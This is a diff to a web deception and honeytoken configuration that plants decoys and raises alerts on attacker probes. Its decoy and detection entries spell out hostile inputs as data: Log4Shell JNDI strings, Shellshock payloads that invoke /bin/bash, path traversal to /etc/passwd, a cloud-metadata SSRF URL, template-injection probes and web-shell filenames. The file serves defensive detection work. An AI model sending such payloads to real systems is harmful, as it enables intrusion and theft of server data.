@@ -8,21 +8,21 @@
       "detect": {}
     },
     {
-      "comment": "1-A: CDN/path-traversal lure in HTML response",
-      "decoy": { "key": "/cdn/assets/../admin/config", "string": "<!-- preload: /cdn/assets/../admin/config -->" },
+      "comment": "1-A: Fake CDN backup URL injected in HTML. Detection fires on the normalized access path (browsers resolve ../ before sending).",
+      "decoy": { "key": "/cdn/admin/config", "string": "<!-- preload: /cdn/assets/../admin/config -->" },
       "inject": { "store": { "inResponse": "/", "withVerb": "GET", "as": "body", "at": { "method": "before", "property": "</head>" } } },
       "detect": {
-        "seek": { "inRequest": ".*", "in": "url" },
+        "seek": { "inRequest": "/cdn/admin/config", "in": "url" },
         "alert": { "severity": "HIGH", "whenSeen": true }
       }
     },
     {
-      "comment": "1-B: Fake admin panel link injected into authenticated page",
+      "comment": "1-B: Fake admin panel link injected into page",
       "decoy": { "key": "/admin/panel", "string": "<!-- admin: /admin/panel -->" },
       "inject": { "store": { "inResponse": ".*", "withVerb": "GET", "as": "body", "at": { "method": "before", "property": "</body>" } } },
       "detect": {
         "seek": { "inRequest": ".*", "in": "url" },
-        "alert": { "severity": "CRITICAL", "whenSeen": true }
+        "alert": { "severity": "HIGH", "whenSeen": true }
       }
     },
     {
@@ -44,53 +44,53 @@
       }
     },
     {
-      "comment": "2-A: Fake .env file disclosure",
+      "comment": "2-A: .env file disclosure probe",
       "decoy": { "key": "/.env" },
       "inject": {},
       "detect": {
         "seek": { "inRequest": "\\.env", "in": "url" },
-        "alert": { "severity": "CRITICAL", "whenSeen": true }
+        "alert": { "severity": "HIGH", "whenSeen": true }
       }
     },
     {
-      "comment": "2-B: alg:none JWT injection — inject fake JWT hint in response header",
+      "comment": "2-B: alg:none JWT hint injected in response header; alert when re-sent",
       "decoy": { "key": "x-auth-hint", "separator": ":", "value": "eyJhbGciOiJub25lIn0" },
       "inject": { "store": { "inResponse": ".*", "withVerb": "GET", "as": "header" } },
       "detect": {
         "seek": { "inRequest": ".*", "in": "header" },
-        "alert": { "severity": "CRITICAL", "whenSeen": true }
+        "alert": { "severity": "HIGH", "whenSeen": true }
       }
     },
     {
-      "comment": "2-C: Fake API key in response body",
+      "comment": "2-C: Fake API key injected in response body",
       "decoy": { "key": "api_key_canary", "string": "<!-- api_key_canary=cad-fake-key-xK9pL2mN -->" },
       "inject": { "store": { "inResponse": ".*", "withVerb": "GET", "as": "body", "at": { "method": "before", "property": "</body>" } } },
       "detect": {
         "seek": { "inRequest": ".*", "in": "payload" },
-        "alert": { "severity": "CRITICAL", "whenSeen": true }
+        "alert": { "severity": "HIGH", "whenSeen": true }
       }
     },
     {
-      "comment": "3-A: SSRF lure — inject fake internal URL in response",
+      "comment": "3-A: SSRF lure injected in API response body",
       "decoy": { "key": "http://169.254.169.254/latest/meta-data/", "string": "<!-- ssrf-target: http://169.254.169.254/latest/meta-data/ -->" },
       "inject": { "store": { "inResponse": "/api/", "withVerb": "GET", "as": "body", "at": { "method": "before", "property": "</body>" } } },
       "detect": {
         "seek": { "inRequest": ".*", "in": "payload" },
-        "alert": { "severity": "CRITICAL", "whenSeen": true }
+        "alert": { "severity": "HIGH", "whenSeen": true }
       }
     },
     {
-      "comment": "3-B: SSRF via URL parameter",
+      "comment": "3-B: SSRF via url GET parameter",
       "decoy": { "key": "url", "value": "http://169.254.169.254" },
       "inject": {},
       "detect": {
         "seek": { "inRequest": ".*", "in": "getParam" },
-        "alert": { "severity": "CRITICAL", "whenSeen": true }
+        "alert": { "severity": "HIGH", "whenSeen": true }
       }
     },
     {
-      "comment": "4-A: Fake X-Forwarded-For header detection",
-      "decoy": { "key": "X-Forwarded-For", "value": "127.0.0.1" },
+      "comment": "4-A: Spoofed X-Forwarded-For header (IP bypass attempt). Headers are lowercase in HTTP/2.",
+      "decoy": { "key": "x-forwarded-for", "value": "127.0.0.1" },
       "inject": {},
       "detect": {
         "seek": { "inRequest": ".*", "in": "header" },
@@ -98,8 +98,8 @@
       }
     },
     {
-      "comment": "4-B: Fake X-Real-IP header detection",
-      "decoy": { "key": "X-Real-IP", "value": "10.0.0.1" },
+      "comment": "4-B: Spoofed X-Real-IP header",
+      "decoy": { "key": "x-real-ip", "value": "10.0.0.1" },
       "inject": {},
       "detect": {
         "seek": { "inRequest": ".*", "in": "header" },
@@ -107,34 +107,34 @@
       }
     },
     {
-      "comment": "4-C: Fake X-Original-URL header detection",
-      "decoy": { "key": "X-Original-URL", "value": "/admin" },
+      "comment": "4-C: X-Original-URL header override attempt",
+      "decoy": { "key": "x-original-url", "value": "/admin" },
       "inject": {},
       "detect": {
         "seek": { "inRequest": ".*", "in": "header" },
-        "alert": { "severity": "CRITICAL", "whenSeen": true }
+        "alert": { "severity": "HIGH", "whenSeen": true }
       }
     },
     {
-      "comment": "5-A: Mass assignment — inject fake 'isAdmin' field in login form",
+      "comment": "5-A: Mass assignment — inject fake isAdmin field in login form",
       "decoy": { "key": "isAdmin", "separator": "=", "value": "false" },
       "inject": { "store": { "inResponse": "/login", "withVerb": "GET", "as": "body", "at": { "method": "before", "property": "</form>" } } },
       "detect": {
         "seek": { "inRequest": ".*", "withVerb": "POST", "in": "postParam" },
-        "alert": { "severity": "CRITICAL", "whenModified": true }
+        "alert": { "severity": "HIGH", "whenModified": true }
       }
     },
     {
-      "comment": "5-B: Mass assignment — inject fake 'role' field",
+      "comment": "5-B: Mass assignment — inject fake role field",
       "decoy": { "key": "role", "separator": "=", "value": "user" },
       "inject": { "store": { "inResponse": "/login", "withVerb": "GET", "as": "body", "at": { "method": "before", "property": "</form>" } } },
       "detect": {
         "seek": { "inRequest": ".*", "withVerb": "POST", "in": "postParam" },
-        "alert": { "severity": "CRITICAL", "whenModified": true }
+        "alert": { "severity": "HIGH", "whenModified": true }
       }
     },
     {
-      "comment": "5-C: Mass assignment — inject fake 'credits' field",
+      "comment": "5-C: Mass assignment — inject fake credits field",
       "decoy": { "key": "credits", "separator": "=", "value": "0" },
       "inject": { "store": { "inResponse": ".*", "withVerb": "GET", "as": "body", "at": { "method": "before", "property": "</form>" } } },
       "detect": {
@@ -143,71 +143,71 @@
       }
     },
     {
-      "comment": "6-A: Path traversal attempt detection",
-      "decoy": { "key": "../etc/passwd" },
+      "comment": "6-A: Path traversal in URL (Envoy normalizes ../ so detection uses normalized path). Tests recon on /etc/passwd path.",
+      "decoy": { "key": "/etc/passwd" },
       "inject": {},
       "detect": {
-        "seek": { "inRequest": "\\.\\./", "in": "url" },
-        "alert": { "severity": "CRITICAL", "whenSeen": true }
+        "seek": { "inRequest": "/etc/passwd", "in": "url" },
+        "alert": { "severity": "HIGH", "whenSeen": true }
       }
     },
     {
-      "comment": "6-B: Path traversal via file parameter",
+      "comment": "6-B: Path traversal via file GET parameter value",
       "decoy": { "key": "file", "value": "../../../../etc/passwd" },
       "inject": {},
       "detect": {
         "seek": { "inRequest": ".*", "in": "getParam" },
-        "alert": { "severity": "CRITICAL", "whenSeen": true }
+        "alert": { "severity": "HIGH", "whenSeen": true }
       }
     },
     {
-      "comment": "6-C: Null-byte injection attempt",
+      "comment": "6-C: Null-byte injection in URL",
       "decoy": { "key": "%00" },
       "inject": {},
       "detect": {
         "seek": { "inRequest": "%00", "in": "url" },
-        "alert": { "severity": "CRITICAL", "whenSeen": true }
+        "alert": { "severity": "HIGH", "whenSeen": true }
       }
     },
     {
-      "comment": "7-A: SSTI via template expression in GET param",
+      "comment": "7-A: SSTI probe via template GET parameter (whenSeen fires on key presence alone)",
       "decoy": { "key": "template", "value": "{{7*7}}" },
       "inject": {},
       "detect": {
         "seek": { "inRequest": ".*", "in": "getParam" },
-        "alert": { "severity": "CRITICAL", "whenSeen": true }
+        "alert": { "severity": "HIGH", "whenSeen": true }
       }
     },
     {
-      "comment": "7-B: SSTI via POST body",
+      "comment": "7-B: SSTI probe via POST body",
       "decoy": { "key": "name", "value": "${7*7}" },
       "inject": {},
       "detect": {
         "seek": { "inRequest": ".*", "withVerb": "POST", "in": "postParam" },
-        "alert": { "severity": "CRITICAL", "whenSeen": true }
+        "alert": { "severity": "HIGH", "whenSeen": true }
       }
     },
     {
-      "comment": "8-A: Magic-bytes / file upload probe (PHP)",
+      "comment": "8-A: PHP shell upload probe via filename POST param",
       "decoy": { "key": "filename", "value": "shell.php" },
       "inject": {},
       "detect": {
         "seek": { "inRequest": ".*", "withVerb": "POST", "in": "payload" },
-        "alert": { "severity": "CRITICAL", "whenSeen": true }
+        "alert": { "severity": "HIGH", "whenSeen": true }
       }
     },
     {
-      "comment": "8-B: Magic-bytes / file upload probe (JSP)",
+      "comment": "8-B: JSP shell upload probe via filename POST param",
       "decoy": { "key": "filename", "value": "shell.jsp" },
       "inject": {},
       "detect": {
         "seek": { "inRequest": ".*", "withVerb": "POST", "in": "payload" },
-        "alert": { "severity": "CRITICAL", "whenSeen": true }
+        "alert": { "severity": "HIGH", "whenSeen": true }
       }
     },
     {
-      "comment": "9-A: Info-disclosure — inject fake version comment",
-      "decoy": { "key": "X-Powered-By", "separator": ":", "value": "neowriter/1.0.0-canary" },
+      "comment": "9-A: Inject fake version header; alert if re-sent in request",
+      "decoy": { "key": "x-powered-by", "separator": ":", "value": "neowriter/1.0.0-canary" },
       "inject": { "store": { "inResponse": ".*", "withVerb": "GET", "as": "header" } },
       "detect": {
         "seek": { "inRequest": ".*", "in": "header" },
@@ -215,7 +215,7 @@
       }
     },
     {
-      "comment": "9-B: Info-disclosure — /version endpoint probe",
+      "comment": "9-B: /version endpoint recon probe",
       "decoy": { "key": "/version" },
       "inject": {},
       "detect": {
@@ -224,7 +224,7 @@
       }
     },
     {
-      "comment": "10-A: Recon — robots.txt probe",
+      "comment": "10-A: robots.txt recon probe",
       "decoy": { "key": "/robots.txt" },
       "inject": {},
       "detect": {
@@ -233,7 +233,7 @@
       }
     },
     {
-      "comment": "10-B: Recon — .git directory probe",
+      "comment": "10-B: .git directory recon probe",
       "decoy": { "key": "/.git" },
       "inject": {},
       "detect": {
@@ -242,7 +242,7 @@
       }
     },
     {
-      "comment": "10-C: Recon — wp-admin probe",
+      "comment": "10-C: WordPress admin panel recon probe",
       "decoy": { "key": "/wp-admin" },
       "inject": {},
       "detect": {
@@ -251,39 +251,39 @@
       }
     },
     {
-      "comment": "L4J-1: Log4Shell via User-Agent",
-      "decoy": { "key": "User-Agent", "value": "${jndi:ldap://canary.example.com/a}" },
+      "comment": "L4J-1: Log4Shell via user-agent header",
+      "decoy": { "key": "user-agent", "value": "${jndi:ldap://canary.example.com/a}" },
       "inject": {},
       "detect": {
         "seek": { "inRequest": ".*", "in": "header" },
-        "alert": { "severity": "CRITICAL", "whenSeen": true }
+        "alert": { "severity": "HIGH", "whenSeen": true }
       }
     },
     {
-      "comment": "L4J-2: Log4Shell via X-Forwarded-For",
-      "decoy": { "key": "X-Forwarded-For", "value": "${jndi:ldap://canary.example.com/a}" },
+      "comment": "L4J-2: Log4Shell via x-forwarded-for header",
+      "decoy": { "key": "x-forwarded-for", "value": "${jndi:ldap://canary.example.com/a}" },
       "inject": {},
       "detect": {
         "seek": { "inRequest": ".*", "in": "header" },
-        "alert": { "severity": "CRITICAL", "whenSeen": true }
+        "alert": { "severity": "HIGH", "whenSeen": true }
       }
     },
     {
-      "comment": "SSH-1: Shellshock via User-Agent",
-      "decoy": { "key": "User-Agent", "value": "() { :; }; echo vulnerable" },
+      "comment": "SSH-1: Shellshock via user-agent header",
+      "decoy": { "key": "user-agent", "value": "() { :; }; echo vulnerable" },
       "inject": {},
       "detect": {
         "seek": { "inRequest": ".*", "in": "header" },
-        "alert": { "severity": "CRITICAL", "whenSeen": true }
+        "alert": { "severity": "HIGH", "whenSeen": true }
       }
     },
     {
-      "comment": "SSH-2: Shellshock via Referer",
-      "decoy": { "key": "Referer", "value": "() { :; }; /bin/bash" },
+      "comment": "SSH-2: Shellshock via referer header",
+      "decoy": { "key": "referer", "value": "() { :; }; /bin/bash" },
       "inject": {},
       "detect": {
         "seek": { "inRequest": ".*", "in": "header" },
-        "alert": { "severity": "CRITICAL", "whenSeen": true }
+        "alert": { "severity": "HIGH", "whenSeen": true }
       }
     }
   ]
